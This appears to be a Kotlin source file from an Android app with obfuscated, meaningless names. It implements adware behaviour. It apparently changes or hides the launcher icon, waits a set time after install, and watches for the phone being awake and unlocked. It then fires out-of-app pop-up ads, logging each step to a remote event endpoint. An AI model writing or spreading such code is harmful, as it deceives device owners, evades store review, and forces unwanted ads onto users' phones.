package com.sister.smart.blonde

import android.app.Activity
import android.app.KeyguardManager
import android.content.Context
import android.os.PowerManager
import com.inmobi.media.Pa
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Date：2025/4/21
 * Describe:
 */
class KindGoogleSister(private val context: Context) : BaseBossInfo() {
    private val mBlondeNetPost by lazy { BlondeNetPost() }
    private var mainScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var kindEvent = ""
    val mBadAdHelper by lazy { BlondeAdHelper(context) }
    private var sisterNum by SmartImplStr()
    private var isFirstStart by SmartImplStr()
    fun eventKind(activity: Activity): Boolean {
        val name = activity::class.java.canonicalName ?: ""
        if (name == "com.unity3d.player.ui.PlayerUnityPage") {
            sisterNum = ""
            if (isFirstStart.isBlank()) {
                isFirstStart = "tong"
                mBlondeNetPost.postEvent(
                    "first_start",
                    Pair("time", "${System.currentTimeMillis() - Headband.appInstallTime}")
                )
            }
            return true
        }
        return false
    }


    fun kindEvent() {
        if (kindEvent.isNotBlank()) return
        kindEvent = "google"
        mainScope.launch {
            // 换icon
            AngelHelper.blonde("4006".toInt())
            mBadAdHelper.load()
            delay(2000)
            while (sisterNum.length < Headband.womenNum) {
                sisterEvent()
                delay(Headband.time1)
            }
            mBlondeNetPost.postEvent("jumpfail")
        }
    }

    private fun sisterEvent() {
        mBlondeNetPost.postEvent("timertask")
        if (isSisterSmart().not()) return
        mBlondeNetPost.postEvent("isunlock")
        if (Headband.isSmartLimit {
                mBlondeNetPost.postEvent("getlimit")
            }) {
            mBlondeNetPost.postEvent("ispass", Pair("string", "limit"))
            return
        }
        if (System.currentTimeMillis() - Headband.appInstallTime < Headband.timeWait) {
            mBlondeNetPost.postEvent("ispass", Pair("string", "www"))
            return
        }
        if (System.currentTimeMillis() - Headband.showTimeAd < Headband.time2Per) {
            mBlondeNetPost.postEvent("ispass", Pair("string", "period"))
            return
        }
        mBlondeNetPost.postEvent("ispass")
        val isr = mBadAdHelper.isReady()
        when (isr) {
            "1" -> {
                mBlondeNetPost.postEvent("isready")
            }

            "2" -> {
                mBlondeNetPost.postEvent("isready1")
            }
        }
        if (mBadAdHelper.isShowingAd().not() || isr != "false") {
            mainScope.launch {
                sisterNum += "a"
                finishAc()
                // 外弹
                mBlondeNetPost.postEvent("callstart")
                AngelHelper.blonde("19".toInt())
            }
        }
    }

    private fun isSisterSmart(): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

}